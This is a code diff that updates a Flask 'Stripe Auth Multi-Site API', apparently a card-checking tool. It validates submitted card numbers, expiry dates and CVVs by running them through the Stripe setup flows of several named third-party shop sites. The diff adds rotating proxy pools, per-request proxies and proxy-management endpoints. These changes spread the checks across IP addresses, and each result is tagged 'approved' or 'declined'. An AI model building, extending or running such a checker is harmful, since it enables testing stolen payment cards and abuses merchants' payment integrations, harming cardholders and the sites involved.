@@ -9,6 +9,11 @@ Supported Target Sites:
 3. Freestone Shooting (freestoneshootingcomplex.com)
 4. Odin Water Polo (odinwaterpolo.com)
 5. Noble Rot (noble-rot.newsstand.co.uk)
+
+Proxy Features:
+- Per-request custom proxy: `&proxy=ip:port:user:pass` or `&proxy=http://...` or `&proxy=socks5://...`
+- Dynamic proxy pool with auto-rotation
+- Proxy management endpoints: `/proxy/add`, `/proxy/list`, `/proxy/clear`, `/proxy/stats`
 """
 
 import re
@@ -90,6 +95,7 @@ class ProxyManager:
     def __init__(self):
         self.proxies = []
         self.index = 0
+        self.usage_count = 0
         self.load_proxies(["proxies.txt", "working_proxies.txt"])
 
     def load_proxies(self, filenames):
@@ -120,12 +126,39 @@ class ProxyManager:
             return f"http://{parts[0]}:{parts[1]}"
         return proxy_str
 
+    def add_proxy(self, proxy_input):
+        if not proxy_input:
+            return 0
+        lines = str(proxy_input).replace(',', '\n').splitlines()
+        added = 0
+        for l in lines:
+            p = self.parse_proxy(l.strip())
+            if p and p not in self.proxies:
+                self.proxies.append(p)
+                added += 1
+        return added
+
+    def clear_proxies(self):
+        cnt = len(self.proxies)
+        self.proxies.clear()
+        self.index = 0
+        return cnt
+
     def get_next(self):
         if not self.proxies:
             return None
         proxy = self.proxies[self.index % len(self.proxies)]
         self.index += 1
+        self.usage_count += 1
         return proxy
+
+    def get_stats(self):
+        return {
+            "total_proxies": len(self.proxies),
+            "current_index": (self.index % len(self.proxies)) if self.proxies else 0,
+            "total_uses": self.usage_count,
+            "proxies": [p.split('@')[-1] if '@' in p else p for p in self.proxies[:20]]
+        }
 
 proxy_manager = ProxyManager()
 
@@ -198,6 +231,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
         if len(mm) == 1:
             mm = '0' + mm
 
+        # Proxy resolution: 1st preference is query param, 2nd is pool rotator
         proxy_url = proxy_manager.parse_proxy(proxy_input) if proxy_input else proxy_manager.get_next()
         site = get_site_config(site_param)
         domain = site["domain"]
@@ -216,6 +250,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                     "status": "error",
                     "message": f"Failed to retrieve Stripe key for {domain}",
                     "site": domain,
+                    "proxy": proxy_url.split('@')[-1] if proxy_url else "direct",
                     "card": cc_input
                 }, 500
 
@@ -300,6 +335,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
             )
 
             json_stripe = resp_stripe.json()
+            used_proxy_tag = proxy_url.split('@')[-1] if proxy_url else "direct"
 
             if 'error' in json_stripe:
                 err = json_stripe['error']
@@ -311,6 +347,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                     "code": decline_code,
                     "message": message,
                     "site": domain,
+                    "proxy": used_proxy_tag,
                     "card": cc_input,
                     "time_ms": elapsed
                 }, 200
@@ -322,6 +359,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                     "status": "error",
                     "message": f"PaymentMethod ID missing from Stripe response: {json_stripe}",
                     "site": domain,
+                    "proxy": used_proxy_tag,
                     "card": cc_input,
                     "time_ms": elapsed
                 }, 500
@@ -335,6 +373,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                     "message": f"Payment Method Created ({pm_id}) 💎",
                     "payment_method_id": pm_id,
                     "site": domain,
+                    "proxy": used_proxy_tag,
                     "card": cc_input,
                     "time_ms": elapsed
                 }, 200
@@ -392,6 +431,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": "succeeded",
                                 "message": "Payment Method Added / SetupIntent Succeeded 💎",
                                 "site": domain,
+                                "proxy": used_proxy_tag,
                                 "card": cc_input,
                                 "time_ms": elapsed
                             }, 200
@@ -411,6 +451,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": "card_declined",
                                 "message": clean_msg,
                                 "site": domain,
+                                "proxy": used_proxy_tag,
                                 "card": cc_input,
                                 "time_ms": elapsed
                             }, 200
@@ -421,6 +462,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": "succeeded",
                                 "message": "Payment Method Added / SetupIntent Succeeded 💎",
                                 "site": domain,
+                                "proxy": used_proxy_tag,
                                 "card": cc_input,
                                 "time_ms": elapsed
                             }, 200
@@ -430,6 +472,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": "card_declined",
                                 "message": "Your card was declined.",
                                 "site": domain,
+                                "proxy": used_proxy_tag,
                                 "card": cc_input,
                                 "time_ms": elapsed
                             }, 200
@@ -442,6 +485,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                 "code": "card_declined",
                 "message": "Your card was declined.",
                 "site": domain,
+                "proxy": used_proxy_tag,
                 "card": cc_input,
                 "time_ms": elapsed
             }, 200
@@ -452,6 +496,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
             "status": "error",
             "message": str(e),
             "site": site.get("domain", "unknown") if 'site' in locals() else "unknown",
+            "proxy": proxy_url.split('@')[-1] if 'proxy_url' in locals() and proxy_url else "direct",
             "card": cc_input,
             "time_ms": elapsed
         }, 500
@@ -464,13 +509,17 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
 def index():
     return jsonify({
         "name": "Stripe Auth Multi-Site API",
-        "version": "2.0.0",
+        "version": "2.1.0",
         "status": "online",
         "sites_count": len(SITES_CONFIG),
+        "proxy_pool": proxy_manager.get_stats(),
         "endpoints": {
-            "/stripe": "GET/POST with ?cc=... or ?key=...",
+            "/stripe": "GET/POST with ?cc=... &site=... &proxy=...",
             "/check": "GET/POST with ?cc=...",
             "/sites": "GET list of configured target sites",
+            "/proxy/add": "GET/POST to add proxies (?proxy=ip:port:user:pass)",
+            "/proxy/list": "GET loaded proxy list",
+            "/proxy/clear": "GET clear loaded proxy pool",
             "/health": "GET health check"
         },
         "sites": [{"id": s["id"], "domain": s["domain"], "active": s["active"]} for s in SITES_CONFIG]
@@ -487,6 +536,51 @@ def list_sites():
         "total": len(SITES_CONFIG),
         "sites": SITES_CONFIG
     })
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# PROXY MANAGEMENT ENDPOINTS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+@app.route('/proxy', methods=['GET'])
+@app.route('/proxy/list', methods=['GET'])
+@app.route('/proxy/stats', methods=['GET'])
+def proxy_stats_endpoint():
+    return jsonify({
+        "status": "success",
+        "stats": proxy_manager.get_stats()
+    })
+
+@app.route('/proxy/add', methods=['GET', 'POST'])
+def proxy_add_endpoint():
+    proxy_val = request.values.get('proxy') or request.values.get('proxies')
+    if not proxy_val and request.is_json:
+        body = request.get_json(silent=True) or {}
+        proxy_val = body.get('proxy') or body.get('proxies')
+    if not proxy_val and request.data:
+        proxy_val = request.data.decode('utf-8', errors='ignore')
+
+    if not proxy_val:
+        return jsonify({"status": "error", "message": "Missing proxy parameter. Use ?proxy=ip:port:user:pass"}), 400
+
+    added = proxy_manager.add_proxy(proxy_val)
+    return jsonify({
+        "status": "success",
+        "message": f"Successfully added {added} proxies",
+        "total_proxies": len(proxy_manager.proxies)
+    })
+
+@app.route('/proxy/clear', methods=['GET', 'POST'])
+def proxy_clear_endpoint():
+    cleared = proxy_manager.clear_proxies()
+    return jsonify({
+        "status": "success",
+        "message": f"Cleared {cleared} proxies from pool",
+        "total_proxies": 0
+    })
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# STRIPE AUTH ENDPOINTS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 @app.route('/stripe', methods=['GET', 'POST'])
 @app.route('/check', methods=['GET', 'POST'])
@@ -512,13 +606,13 @@ def stripe_endpoint():
         return jsonify({
             "status": "error",
             "message": "Missing or invalid cc parameter. Format: cc=num|mm|yy|cvv",
-            "example": "/check?cc=4000001234567890|12|28|123"
+            "example": "/check?cc=4000001234567890|12|28|123&proxy=ip:port:user:pass"
         }), 400
 
     result, status_code = asyncio.run(process_stripe_auth(cc, site_param, proxy_param))
 
     if fmt == 'text':
-        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | MSG: {result.get('message', '')} | SITE: {result.get('site', '')} | CARD: {result.get('card', '')}"
+        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | MSG: {result.get('message', '')} | SITE: {result.get('site', '')} | PROXY: {result.get('proxy', '')} | CARD: {result.get('card', '')}"
         return Response(text_out, mimetype='text/plain'), status_code
 
     return jsonify(result), status_code
@@ -531,7 +625,7 @@ def catch_all_routes(catch_all):
         proxy_param = request.values.get('proxy')
         result, status_code = asyncio.run(process_stripe_auth(cc, site_param, proxy_param))
         return jsonify(result), status_code
-    return jsonify({"error": "Route not found", "available_routes": ["/check", "/stripe", "/sites", "/health"]}), 404
+    return jsonify({"error": "Route not found", "available_routes": ["/check", "/stripe", "/sites", "/proxy/add", "/proxy/list", "/health"]}), 404
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
